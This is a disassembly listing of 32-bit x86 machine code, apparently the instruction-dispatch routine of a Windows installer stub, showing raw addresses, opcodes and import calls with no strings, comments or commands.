  401dbd:	be c8 a0 40 00       	mov    $0x40a0c8,%esi
  401dc2:	56                   	push   %esi
  401dc3:	e8 07 42 00 00       	call   0x405fcf
  401dc8:	a1 c0 a0 40 00       	mov    0x40a0c0,%eax
  401dcd:	83 c0 04             	add    $0x4,%eax
  401dd0:	50                   	push   %eax
  401dd1:	57                   	push   %edi
  401dd2:	e8 f8 41 00 00       	call   0x405fcf
  401dd7:	a1 c0 a0 40 00       	mov    0x40a0c0,%eax
  401ddc:	56                   	push   %esi
  401ddd:	83 c0 04             	add    $0x4,%eax
  401de0:	50                   	push   %eax
  401de1:	e9 ff 0c 00 00       	jmp    0x402ae5
  401de6:	85 d2                	test   %edx,%edx
  401de8:	74 1f                	je     0x401e09
  401dea:	85 f6                	test   %esi,%esi
  401dec:	0f 84 ef f9 ff ff    	je     0x4017e1
  401df2:	8d 46 04             	lea    0x4(%esi),%eax
  401df5:	50                   	push   %eax
  401df6:	57                   	push   %edi
  401df7:	e8 d3 41 00 00       	call   0x405fcf
  401dfc:	8b 06                	mov    (%esi),%eax
  401dfe:	a3 c0 a0 40 00       	mov    %eax,0x40a0c0
  401e03:	56                   	push   %esi
  401e04:	e9 f0 03 00 00       	jmp    0x4021f9
  401e09:	68 0c 40 00 00       	push   $0x400c
  401e0e:	6a 40                	push   $0x40
  401e10:	ff 15 24 81 40 00    	call   *0x408124
  401e16:	ff 75 dc             	push   -0x24(%ebp)
  401e19:	8b f0                	mov    %eax,%esi
  401e1b:	8d 46 04             	lea    0x4(%esi),%eax
  401e1e:	50                   	push   %eax
  401e1f:	e8 2c 48 00 00       	call   0x406650
  401e24:	a1 c0 a0 40 00       	mov    0x40a0c0,%eax
  401e29:	89 06                	mov    %eax,(%esi)
  401e2b:	89 35 c0 a0 40 00    	mov    %esi,0x40a0c0
  401e31:	e9 e2 0e 00 00       	jmp    0x402d18
  401e36:	6a 03                	push   $0x3
  401e38:	59                   	pop    %ecx
  401e39:	e8 c8 f6 ff ff       	call   0x401506
  401e3e:	6a 04                	push   $0x4
  401e40:	59                   	pop    %ecx
  401e41:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401e44:	e8 bd f6 ff ff       	call   0x401506
  401e49:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401e4d:	89 45 08             	mov    %eax,0x8(%ebp)
  401e50:	74 0b                	je     0x401e5d
  401e52:	6a 33                	push   $0x33
  401e54:	5e                   	pop    %esi
  401e55:	e8 c2 f6 ff ff       	call   0x40151c
  401e5a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401e5d:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401e61:	74 0b                	je     0x401e6e
  401e63:	6a 44                	push   $0x44
  401e65:	5e                   	pop    %esi
  401e66:	e8 b1 f6 ff ff       	call   0x40151c
  401e6b:	89 45 08             	mov    %eax,0x8(%ebp)
  401e6e:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401e72:	75 4b                	jne    0x401ebf
  401e74:	33 c9                	xor    %ecx,%ecx
  401e76:	41                   	inc    %ecx
  401e77:	e8 8a f6 ff ff       	call   0x401506
  401e7c:	6a 02                	push   $0x2
  401e7e:	59                   	pop    %ecx
  401e7f:	8b f0                	mov    %eax,%esi
  401e81:	e8 80 f6 ff ff       	call   0x401506
  401e86:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401e89:	c1 f9 02             	sar    $0x2,%ecx
  401e8c:	85 c9                	test   %ecx,%ecx
  401e8e:	74 1f                	je     0x401eaf
  401e90:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401e93:	52                   	push   %edx
  401e94:	51                   	push   %ecx
  401e95:	6a 00                	push   $0x0
  401e97:	ff 75 08             	push   0x8(%ebp)
  401e9a:	ff 75 f8             	push   -0x8(%ebp)
  401e9d:	50                   	push   %eax
  401e9e:	56                   	push   %esi
  401e9f:	ff 15 40 82 40 00    	call   *0x408240
  401ea5:	f7 d8                	neg    %eax
  401ea7:	1b c0                	sbb    %eax,%eax
  401ea9:	40                   	inc    %eax
  401eaa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ead:	eb 45                	jmp    0x401ef4
  401eaf:	ff 75 08             	push   0x8(%ebp)
  401eb2:	ff 75 f8             	push   -0x8(%ebp)
  401eb5:	50                   	push   %eax
  401eb6:	56                   	push   %esi
  401eb7:	ff 15 7c 82 40 00    	call   *0x40827c
  401ebd:	eb 32                	jmp    0x401ef1
  401ebf:	33 f6                	xor    %esi,%esi
  401ec1:	46                   	inc    %esi
  401ec2:	e8 55 f6 ff ff       	call   0x40151c
  401ec7:	6a 12                	push   $0x12
  401ec9:	5e                   	pop    %esi
  401eca:	8b d8                	mov    %eax,%ebx
  401ecc:	e8 4b f6 ff ff       	call   0x40151c
  401ed1:	0f b7 08             	movzwl (%eax),%ecx
  401ed4:	f7 d9                	neg    %ecx
  401ed6:	1b c9                	sbb    %ecx,%ecx
  401ed8:	23 c8                	and    %eax,%ecx
  401eda:	0f b7 03             	movzwl (%ebx),%eax
  401edd:	f7 d8                	neg    %eax
  401edf:	51                   	push   %ecx
  401ee0:	1b c0                	sbb    %eax,%eax
  401ee2:	23 c3                	and    %ebx,%eax
  401ee4:	50                   	push   %eax
  401ee5:	ff 75 08             	push   0x8(%ebp)
  401ee8:	ff 75 f8             	push   -0x8(%ebp)
  401eeb:	ff 15 60 82 40 00    	call   *0x408260
  401ef1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401ef4:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  401ef8:	0f 8c 1a 0e 00 00    	jl     0x402d18
  401efe:	ff 75 f4             	push   -0xc(%ebp)
  401f01:	e9 0c 0e 00 00       	jmp    0x402d12
  401f06:	33 c9                	xor    %ecx,%ecx
  401f08:	e8 f9 f5 ff ff       	call   0x401506
  401f0d:	50                   	push   %eax
  401f0e:	ff 15 98 82 40 00    	call   *0x408298
  401f14:	e9 6a f9 ff ff       	jmp    0x401883
  401f19:	6a 02                	push   $0x2
  401f1b:	59                   	pop    %ecx
  401f1c:	e8 e5 f5 ff ff       	call   0x401506
  401f21:	33 c9                	xor    %ecx,%ecx
  401f23:	50                   	push   %eax
  401f24:	41                   	inc    %ecx
  401f25:	e8 dc f5 ff ff       	call   0x401506
  401f2a:	50                   	push   %eax
  401f2b:	ff 15 64 82 40 00    	call   *0x408264
  401f31:	e9 db 0d 00 00       	jmp    0x402d11
  401f36:	a1 08 46 47 00       	mov    0x474608,%eax
  401f3b:	03 c2                	add    %edx,%eax
  401f3d:	50                   	push   %eax
  401f3e:	6a eb                	push   $0xffffffeb
  401f40:	33 c9                	xor    %ecx,%ecx
  401f42:	e8 bf f5 ff ff       	call   0x401506
  401f47:	50                   	push   %eax
  401f48:	ff 15 68 82 40 00    	call   *0x408268
  401f4e:	e9 c5 0d 00 00       	jmp    0x402d18
  401f53:	52                   	push   %edx
  401f54:	ff 75 f8             	push   -0x8(%ebp)
  401f57:	ff 15 64 82 40 00    	call   *0x408264
  401f5d:	8b f8                	mov    %eax,%edi
  401f5f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401f62:	50                   	push   %eax
  401f63:	57                   	push   %edi
  401f64:	ff 15 88 82 40 00    	call   *0x408288
  401f6a:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401f6d:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401f71:	6a 10                	push   $0x10
  401f73:	50                   	push   %eax
  401f74:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401f77:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401f7b:	50                   	push   %eax
  401f7c:	33 db                	xor    %ebx,%ebx
  401f7e:	53                   	push   %ebx
  401f7f:	33 f6                	xor    %esi,%esi
  401f81:	e8 96 f5 ff ff       	call   0x40151c
  401f86:	50                   	push   %eax
  401f87:	53                   	push   %ebx
  401f88:	ff 15 6c 82 40 00    	call   *0x40826c
  401f8e:	50                   	push   %eax
  401f8f:	53                   	push   %ebx
  401f90:	68 72 01 00 00       	push   $0x172
  401f95:	57                   	push   %edi
  401f96:	ff 15 7c 82 40 00    	call   *0x40827c
  401f9c:	3b c3                	cmp    %ebx,%eax
  401f9e:	0f 84 74 0d 00 00    	je     0x402d18
  401fa4:	50                   	push   %eax
  401fa5:	ff 15 44 80 40 00    	call   *0x408044
  401fab:	e9 68 0d 00 00       	jmp    0x402d18
  401fb0:	6a 48                	push   $0x48
  401fb2:	6a 5a                	push   $0x5a
  401fb4:	ff 75 f8             	push   -0x8(%ebp)
  401fb7:	ff 15 70 82 40 00    	call   *0x408270
  401fbd:	50                   	push   %eax
  401fbe:	ff 15 40 80 40 00    	call   *0x408040
  401fc4:	50                   	push   %eax
  401fc5:	6a 02                	push   $0x2
  401fc7:	59                   	pop    %ecx
  401fc8:	e8 39 f5 ff ff       	call   0x401506
  401fcd:	50                   	push   %eax
  401fce:	ff 15 4c 81 40 00    	call   *0x40814c
  401fd4:	6a 03                	push   $0x3
  401fd6:	f7 d8                	neg    %eax
  401fd8:	59                   	pop    %ecx
  401fd9:	a3 f0 e0 41 00       	mov    %eax,0x41e0f0
  401fde:	e8 23 f5 ff ff       	call   0x401506
  401fe3:	ff 75 e0             	push   -0x20(%ebp)
  401fe6:	a3 00 e1 41 00       	mov    %eax,0x41e100
  401feb:	8a 45 ec             	mov    -0x14(%ebp),%al
  401fee:	8a c8                	mov    %al,%cl
  401ff0:	80 e1 01             	and    $0x1,%cl
  401ff3:	88 0d 04 e1 41 00    	mov    %cl,0x41e104
  401ff9:	8a c8                	mov    %al,%cl
  401ffb:	80 e1 02             	and    $0x2,%cl
  401ffe:	24 04                	and    $0x4,%al
  402000:	68 0c e1 41 00       	push   $0x41e10c
  402005:	88 0d 05 e1 41 00    	mov    %cl,0x41e105
  40200b:	a2 06 e1 41 00       	mov    %al,0x41e106
  402010:	c6 05 07 e1 41 00 01 	movb   $0x1,0x41e107
  402017:	e8 34 46 00 00       	call   0x406650
  40201c:	68 f0 e0 41 00       	push   $0x41e0f0
  402021:	ff 15 4c 80 40 00    	call   *0x40804c
  402027:	e9 e5 0c 00 00       	jmp    0x402d11
  40202c:	33 c9                	xor    %ecx,%ecx
  40202e:	e8 d3 f4 ff ff       	call   0x401506
  402033:	33 c9                	xor    %ecx,%ecx
  402035:	41                   	inc    %ecx
  402036:	8b f0                	mov    %eax,%esi
  402038:	e8 c9 f4 ff ff       	call   0x401506
  40203d:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  402041:	50                   	push   %eax
  402042:	56                   	push   %esi
  402043:	75 0b                	jne    0x402050
  402045:	ff 15 38 82 40 00    	call   *0x408238
  40204b:	e9 c8 0c 00 00       	jmp    0x402d18
  402050:	ff 15 74 82 40 00    	call   *0x408274
  402056:	e9 bd 0c 00 00       	jmp    0x402d18
  40205b:	33 f6                	xor    %esi,%esi
  40205d:	e8 ba f4 ff ff       	call   0x40151c
  402062:	6a 31                	push   $0x31
  402064:	5e                   	pop    %esi
  402065:	8b f8                	mov    %eax,%edi
  402067:	e8 b0 f4 ff ff       	call   0x40151c
  40206c:	6a 22                	push   $0x22
  40206e:	5e                   	pop    %esi
  40206f:	89 45 08             	mov    %eax,0x8(%ebp)
  402072:	e8 a5 f4 ff ff       	call   0x40151c
  402077:	6a 15                	push   $0x15
  402079:	5e                   	pop    %esi
  40207a:	8b d8                	mov    %eax,%ebx
  40207c:	e8 9b f4 ff ff       	call   0x40151c
  402081:	6a ec                	push   $0xffffffec
  402083:	e8 6d f4 ff ff       	call   0x4014f5
  402088:	0f b7 03             	movzwl (%ebx),%eax
  40208b:	ff 75 e8             	push   -0x18(%ebp)
  40208e:	f7 d8                	neg    %eax
  402090:	1b c0                	sbb    %eax,%eax
  402092:	23 c3                	and    %ebx,%eax
  402094:	68 b0 d0 4c 00       	push   $0x4cd0b0
  402099:	50                   	push   %eax
  40209a:	0f b7 07             	movzwl (%edi),%eax
  40209d:	ff 75 08             	push   0x8(%ebp)
  4020a0:	f7 d8                	neg    %eax
  4020a2:	1b c0                	sbb    %eax,%eax
  4020a4:	23 c7                	and    %edi,%eax
  4020a6:	50                   	push   %eax
  4020a7:	ff 75 f8             	push   -0x8(%ebp)
  4020aa:	ff 15 88 81 40 00    	call   *0x408188
  4020b0:	83 f8 21             	cmp    $0x21,%eax
  4020b3:	0f 8d 5f 0c 00 00    	jge    0x402d18
  4020b9:	e9 23 f7 ff ff       	jmp    0x4017e1
  4020be:	33 f6                	xor    %esi,%esi
  4020c0:	e8 57 f4 ff ff       	call   0x40151c
  4020c5:	8b f0                	mov    %eax,%esi
  4020c7:	56                   	push   %esi
  4020c8:	6a eb                	push   $0xffffffeb
  4020ca:	e8 c3 2d 00 00       	call   0x404e92
  4020cf:	56                   	push   %esi
  4020d0:	e8 d0 3a 00 00       	call   0x405ba5
  4020d5:	89 45 08             	mov    %eax,0x8(%ebp)
  4020d8:	85 c0                	test   %eax,%eax
  4020da:	0f 84 01 f7 ff ff    	je     0x4017e1
  4020e0:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4020e4:	74 4f                	je     0x402135
  4020e6:	8b 35 28 81 40 00    	mov    0x408128,%esi
  4020ec:	6a 64                	push   $0x64
  4020ee:	50                   	push   %eax
  4020ef:	ff d6                	call   *%esi
  4020f1:	bf 02 01 00 00       	mov    $0x102,%edi
  4020f6:	eb 0e                	jmp    0x402106
  4020f8:	6a 0f                	push   $0xf
  4020fa:	e8 7d 40 00 00       	call   0x40617c
  4020ff:	6a 64                	push   $0x64
  402101:	ff 75 08             	push   0x8(%ebp)
  402104:	ff d6                	call   *%esi
  402106:	3b c7                	cmp    %edi,%eax
  402108:	74 ee                	je     0x4020f8
  40210a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40210d:	50                   	push   %eax
  40210e:	ff 75 08             	push   0x8(%ebp)
  402111:	ff 15 2c 81 40 00    	call   *0x40812c
  402117:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40211b:	7c 0b                	jl     0x402128
  40211d:	ff 75 f4             	push   -0xc(%ebp)
  402120:	53                   	push   %ebx
  402121:	e8 f0 3d 00 00       	call   0x405f16
  402126:	eb 0d                	jmp    0x402135
  402128:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40212c:	74 07                	je     0x402135
  40212e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402135:	ff 75 08             	push   0x8(%ebp)
  402138:	e9 40 06 00 00       	jmp    0x40277d
  40213d:	6a 02                	push   $0x2
  40213f:	5e                   	pop    %esi
  402140:	e8 d7 f3 ff ff       	call   0x40151c
  402145:	50                   	push   %eax
  402146:	e8 d3 3f 00 00       	call   0x40611e
  40214b:	8b f0                	mov    %eax,%esi
  40214d:	85 f6                	test   %esi,%esi
  40214f:	74 11                	je     0x402162
  402151:	ff 76 14             	push   0x14(%esi)
  402154:	53                   	push   %ebx
  402155:	e8 bc 3d 00 00       	call   0x405f16
  40215a:	ff 76 18             	push   0x18(%esi)
  40215d:	e9 b0 0b 00 00       	jmp    0x402d12
  402162:	33 c0                	xor    %eax,%eax
  402164:	66 89 07             	mov    %ax,(%edi)
  402167:	66 89 03             	mov    %ax,(%ebx)
  40216a:	e9 72 f6 ff ff       	jmp    0x4017e1
  40216f:	6a ee                	push   $0xffffffee
  402171:	5e                   	pop    %esi
  402172:	e8 a5 f3 ff ff       	call   0x40151c
  402177:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40217a:	51                   	push   %ecx
  40217b:	50                   	push   %eax
  40217c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40217f:	e8 68 56 00 00       	call   0x4077ec
  402184:	8b f0                	mov    %eax,%esi
  402186:	33 c0                	xor    %eax,%eax
  402188:	66 89 07             	mov    %ax,(%edi)
  40218b:	66 89 03             	mov    %ax,(%ebx)
  40218e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402195:	85 f6                	test   %esi,%esi
  402197:	0f 84 7b 0b 00 00    	je     0x402d18
  40219d:	56                   	push   %esi
  40219e:	6a 40                	push   $0x40
  4021a0:	ff 15 24 81 40 00    	call   *0x408124
  4021a6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021a9:	85 c0                	test   %eax,%eax
  4021ab:	0f 84 67 0b 00 00    	je     0x402d18
  4021b1:	50                   	push   %eax
  4021b2:	56                   	push   %esi
  4021b3:	6a 00                	push   $0x0
  4021b5:	ff 75 d4             	push   -0x2c(%ebp)
  4021b8:	e8 29 56 00 00       	call   0x4077e6
  4021bd:	85 c0                	test   %eax,%eax
  4021bf:	74 35                	je     0x4021f6
  4021c1:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4021c4:	50                   	push   %eax
  4021c5:	8d 45 08             	lea    0x8(%ebp),%eax
  4021c8:	50                   	push   %eax
  4021c9:	68 d0 82 40 00       	push   $0x4082d0
  4021ce:	ff 75 f4             	push   -0xc(%ebp)
  4021d1:	e8 0a 56 00 00       	call   0x4077e0
  4021d6:	85 c0                	test   %eax,%eax
  4021d8:	74 1c                	je     0x4021f6
  4021da:	8b 45 08             	mov    0x8(%ebp),%eax
  4021dd:	ff 70 08             	push   0x8(%eax)
  4021e0:	57                   	push   %edi
  4021e1:	e8 30 3d 00 00       	call   0x405f16
  4021e6:	8b 45 08             	mov    0x8(%ebp),%eax
  4021e9:	ff 70 0c             	push   0xc(%eax)
  4021ec:	53                   	push   %ebx
  4021ed:	e8 24 3d 00 00       	call   0x405f16
  4021f2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4021f6:	ff 75 f4             	push   -0xc(%ebp)
  4021f9:	ff 15 30 81 40 00    	call   *0x408130
  4021ff:	e9 14 0b 00 00       	jmp    0x402d18
  402204:	83 3d b8 46 47 00 00 	cmpl   $0x0,0x4746b8
  40220b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402212:	0f 8c b9 00 00 00    	jl     0x4022d1
  402218:	6a f0                	push   $0xfffffff0
  40221a:	5e                   	pop    %esi
  40221b:	e8 fc f2 ff ff       	call   0x40151c
  402220:	33 f6                	xor    %esi,%esi
  402222:	46                   	inc    %esi
  402223:	8b f8                	mov    %eax,%edi
  402225:	e8 f2 f2 ff ff       	call   0x40151c
  40222a:	33 f6                	xor    %esi,%esi
  40222c:	89 45 08             	mov    %eax,0x8(%ebp)
  40222f:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  402232:	74 0d                	je     0x402241
  402234:	57                   	push   %edi
  402235:	ff 15 34 81 40 00    	call   *0x408134
  40223b:	8b d8                	mov    %eax,%ebx
  40223d:	3b de                	cmp    %esi,%ebx
  40223f:	75 10                	jne    0x402251
  402241:	6a 08                	push   $0x8
  402243:	56                   	push   %esi
  402244:	57                   	push   %edi
  402245:	ff 15 38 81 40 00    	call   *0x408138
  40224b:	8b d8                	mov    %eax,%ebx
  40224d:	3b de                	cmp    %esi,%ebx
  40224f:	74 79                	je     0x4022ca
  402251:	ff 75 08             	push   0x8(%ebp)
  402254:	53                   	push   %ebx
  402255:	e8 55 3f 00 00       	call   0x4061af
  40225a:	8b f8                	mov    %eax,%edi
  40225c:	3b fe                	cmp    %esi,%edi
  40225e:	74 3d                	je     0x40229d
  402260:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402263:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402266:	74 17                	je     0x40227f
  402268:	ff 75 e4             	push   -0x1c(%ebp)
  40226b:	e8 85 f2 ff ff       	call   0x4014f5
  402270:	ff d7                	call   *%edi
  402272:	85 c0                	test   %eax,%eax
  402274:	74 31                	je     0x4022a7
  402276:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40227d:	eb 28                	jmp    0x4022a7
  40227f:	68 00 a0 40 00       	push   $0x40a000
  402284:	68 c0 a0 40 00       	push   $0x40a0c0
  402289:	68 00 50 47 00       	push   $0x475000
  40228e:	68 04 20 00 00       	push   $0x2004
  402293:	ff 75 f8             	push   -0x8(%ebp)
  402296:	ff d7                	call   *%edi
  402298:	83 c4 14             	add    $0x14,%esp
  40229b:	eb 0a                	jmp    0x4022a7
  40229d:	ff 75 08             	push   0x8(%ebp)
  4022a0:	6a f7                	push   $0xfffffff7
  4022a2:	e8 eb 2b 00 00       	call   0x404e92
  4022a7:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  4022aa:	0f 85 68 0a 00 00    	jne    0x402d18
  4022b0:	53                   	push   %ebx
  4022b1:	e8 a1 19 00 00       	call   0x403c57
  4022b6:	85 c0                	test   %eax,%eax
  4022b8:	0f 84 5a 0a 00 00    	je     0x402d18
  4022be:	53                   	push   %ebx
  4022bf:	ff 15 3c 81 40 00    	call   *0x40813c
  4022c5:	e9 4e 0a 00 00       	jmp    0x402d18
  4022ca:	6a f6                	push   $0xfffffff6
  4022cc:	e9 9b f5 ff ff       	jmp    0x40186c
  4022d1:	6a e7                	push   $0xffffffe7
  4022d3:	e9 94 f5 ff ff       	jmp    0x40186c
  4022d8:	6a f0                	push   $0xfffffff0
  4022da:	5e                   	pop    %esi
  4022db:	e8 3c f2 ff ff       	call   0x40151c
  4022e0:	6a df                	push   $0xffffffdf
  4022e2:	5e                   	pop    %esi
  4022e3:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4022e6:	e8 31 f2 ff ff       	call   0x40151c
  4022eb:	6a 02                	push   $0x2
  4022ed:	5e                   	pop    %esi
  4022ee:	8b d8                	mov    %eax,%ebx
  4022f0:	e8 27 f2 ff ff       	call   0x40151c
  4022f5:	6a cd                	push   $0xffffffcd
  4022f7:	5e                   	pop    %esi
  4022f8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4022fb:	e8 1c f2 ff ff       	call   0x40151c
  402300:	6a 45                	push   $0x45
  402302:	5e                   	pop    %esi
  402303:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402306:	e8 11 f2 ff ff       	call   0x40151c
  40230b:	53                   	push   %ebx
  40230c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40230f:	e8 77 39 00 00       	call   0x405c8b
  402314:	85 c0                	test   %eax,%eax
  402316:	75 08                	jne    0x402320
  402318:	6a 21                	push   $0x21
  40231a:	5e                   	pop    %esi
  40231b:	e8 fc f1 ff ff       	call   0x40151c
  402320:	8d 45 08             	lea    0x8(%ebp),%eax
  402323:	50                   	push   %eax
  402324:	68 48 8a 40 00       	push   $0x408a48
  402329:	6a 01                	push   $0x1
  40232b:	6a 00                	push   $0x0
  40232d:	68 68 8a 40 00       	push   $0x408a68
  402332:	ff 15 bc 82 40 00    	call   *0x4082bc
  402338:	85 c0                	test   %eax,%eax
  40233a:	0f 8c bb 00 00 00    	jl     0x4023fb
  402340:	8b 45 08             	mov    0x8(%ebp),%eax
  402343:	8b 08                	mov    (%eax),%ecx
  402345:	8d 55 f4             	lea    -0xc(%ebp),%edx
  402348:	52                   	push   %edx
  402349:	68 58 8a 40 00       	push   $0x408a58
  40234e:	50                   	push   %eax
  40234f:	ff 11                	call   *(%ecx)
  402351:	8b f8                	mov    %eax,%edi
  402353:	85 ff                	test   %edi,%edi
  402355:	0f 8c 93 00 00 00    	jl     0x4023ee
  40235b:	8b 45 08             	mov    0x8(%ebp),%eax
  40235e:	8b 08                	mov    (%eax),%ecx
  402360:	53                   	push   %ebx
  402361:	50                   	push   %eax
  402362:	ff 51 50             	call   *0x50(%ecx)
  402365:	8b f8                	mov    %eax,%edi
  402367:	8b 45 08             	mov    0x8(%ebp),%eax
  40236a:	8b 08                	mov    (%eax),%ecx
  40236c:	68 b0 d0 4c 00       	push   $0x4cd0b0
  402371:	50                   	push   %eax
  402372:	ff 51 24             	call   *0x24(%ecx)
  402375:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402378:	8b c1                	mov    %ecx,%eax
  40237a:	c1 f8 08             	sar    $0x8,%eax
  40237d:	be ff 00 00 00       	mov    $0xff,%esi
  402382:	23 c6                	and    %esi,%eax
  402384:	74 0d                	je     0x402393
  402386:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402389:	8b 11                	mov    (%ecx),%edx
  40238b:	50                   	push   %eax
  40238c:	51                   	push   %ecx
  40238d:	ff 52 3c             	call   *0x3c(%edx)
  402390:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402393:	8b 45 08             	mov    0x8(%ebp),%eax
  402396:	8b 10                	mov    (%eax),%edx
  402398:	c1 f9 10             	sar    $0x10,%ecx
  40239b:	51                   	push   %ecx
  40239c:	50                   	push   %eax
  40239d:	ff 52 34             	call   *0x34(%edx)
  4023a0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4023a3:	66 83 38 00          	cmpw   $0x0,(%eax)
  4023a7:	74 10                	je     0x4023b9
  4023a9:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  4023ac:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4023af:	8b 11                	mov    (%ecx),%edx
  4023b1:	23 de                	and    %esi,%ebx
  4023b3:	53                   	push   %ebx
  4023b4:	50                   	push   %eax
  4023b5:	51                   	push   %ecx
  4023b6:	ff 52 44             	call   *0x44(%edx)
  4023b9:	8b 45 08             	mov    0x8(%ebp),%eax
  4023bc:	ff 75 f8             	push   -0x8(%ebp)
  4023bf:	8b 08                	mov    (%eax),%ecx
  4023c1:	50                   	push   %eax
  4023c2:	ff 51 2c             	call   *0x2c(%ecx)
  4023c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4023c8:	ff 75 cc             	push   -0x34(%ebp)
  4023cb:	8b 08                	mov    (%eax),%ecx
  4023cd:	50                   	push   %eax
  4023ce:	ff 51 1c             	call   *0x1c(%ecx)
  4023d1:	85 ff                	test   %edi,%edi
  4023d3:	7c 10                	jl     0x4023e5
  4023d5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4023d8:	8b 08                	mov    (%eax),%ecx
  4023da:	6a 01                	push   $0x1
  4023dc:	ff 75 c4             	push   -0x3c(%ebp)
  4023df:	50                   	push   %eax
  4023e0:	ff 51 18             	call   *0x18(%ecx)
  4023e3:	8b f8                	mov    %eax,%edi
  4023e5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4023e8:	8b 08                	mov    (%eax),%ecx
  4023ea:	50                   	push   %eax
  4023eb:	ff 51 08             	call   *0x8(%ecx)
  4023ee:	8b 45 08             	mov    0x8(%ebp),%eax
  4023f1:	8b 08                	mov    (%eax),%ecx
  4023f3:	50                   	push   %eax
  4023f4:	ff 51 08             	call   *0x8(%ecx)
  4023f7:	85 ff                	test   %edi,%edi
  4023f9:	7d 0e                	jge    0x402409
  4023fb:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402402:	6a f0                	push   $0xfffffff0
  402404:	e9 63 f4 ff ff       	jmp    0x40186c
  402409:	6a f4                	push   $0xfffffff4
  40240b:	e9 5c f4 ff ff       	jmp    0x40186c
  402410:	33 f6                	xor    %esi,%esi
  402412:	e8 05 f1 ff ff       	call   0x40151c
  402417:	6a 11                	push   $0x11
  402419:	5e                   	pop    %esi
  40241a:	8b f8                	mov    %eax,%edi
  40241c:	e8 fb f0 ff ff       	call   0x40151c
  402421:	6a 23                	push   $0x23
  402423:	5e                   	pop    %esi
  402424:	8b d8                	mov    %eax,%ebx
  402426:	e8 f1 f0 ff ff       	call   0x40151c
  40242b:	57                   	push   %edi
  40242c:	8b f0                	mov    %eax,%esi
  40242e:	e8 eb 3c 00 00       	call   0x40611e
  402433:	85 c0                	test   %eax,%eax
  402435:	75 0e                	jne    0x402445
  402437:	6a 00                	push   $0x0
  402439:	6a f9                	push   $0xfffffff9
  40243b:	e8 52 2a 00 00       	call   0x404e92
  402440:	e9 9c f3 ff ff       	jmp    0x4017e1
  402445:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402448:	57                   	push   %edi
  402449:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40244c:	c7 45 b0 02 00 00 00 	movl   $0x2,-0x50(%ebp)
  402453:	e8 8d 3b 00 00       	call   0x405fe5
  402458:	33 c9                	xor    %ecx,%ecx
  40245a:	53                   	push   %ebx
  40245b:	66 89 4c 47 02       	mov    %cx,0x2(%edi,%eax,2)
  402460:	e8 80 3b 00 00       	call   0x405fe5
  402465:	33 c9                	xor    %ecx,%ecx
  402467:	66 89 4c 43 02       	mov    %cx,0x2(%ebx,%eax,2)
  40246c:	66 8b 45 e4          	mov    -0x1c(%ebp),%ax
  402470:	56                   	push   %esi
  402471:	51                   	push   %ecx
  402472:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  402475:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  402478:	89 75 c6             	mov    %esi,-0x3a(%ebp)
  40247b:	66 89 45 bc          	mov    %ax,-0x44(%ebp)
  40247f:	e8 0e 2a 00 00       	call   0x404e92
  402484:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402487:	50                   	push   %eax
  402488:	ff 15 8c 81 40 00    	call   *0x40818c
  40248e:	85 c0                	test   %eax,%eax
  402490:	0f 84 82 08 00 00    	je     0x402d18
  402496:	eb 9f                	jmp    0x402437
  402498:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  40249d:	0f 85 02 f9 ff ff    	jne    0x401da5
  4024a3:	ff 05 94 46 47 00    	incl   0x474694
  4024a9:	e9 6a 08 00 00       	jmp    0x402d18
  4024ae:	33 db                	xor    %ebx,%ebx
  4024b0:	33 ff                	xor    %edi,%edi
  4024b2:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4024b5:	3b c3                	cmp    %ebx,%eax
  4024b7:	74 0c                	je     0x4024c5
  4024b9:	33 f6                	xor    %esi,%esi
  4024bb:	e8 5c f0 ff ff       	call   0x40151c
